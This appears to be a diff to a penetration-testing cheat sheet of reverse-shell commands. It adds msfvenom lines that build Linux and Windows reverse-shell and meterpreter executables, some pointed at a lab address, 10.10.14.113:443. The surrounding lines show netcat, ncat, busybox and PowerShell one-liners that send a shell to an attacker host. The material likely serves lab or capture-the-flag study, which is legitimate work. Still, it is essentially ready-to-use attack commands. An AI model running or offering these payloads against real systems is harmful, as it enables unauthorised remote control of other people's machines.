@@ -15,6 +15,7 @@ $ nc <IP-Attacker> <Port> -e sh
 $ nc <IP-Attacker> <Port> -e /bin/bash
 $ busybox nc <IP-Attacker> <Port> -e sh
 $ ncat <IP-Attacker> <Port> -e sh
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP-Attacker> LPORT=<Port> -f elf > nameoffile.elf
 ````
 
 ### Windows
@@ -30,6 +31,8 @@ $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient
 --------------------------------------------------------------------------------------------
 > nc.exe <IP-Attacker> <Port> -e cmd.exe
 > powershell -e base64_payload
+> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
 ````
 
 **Other Languages**
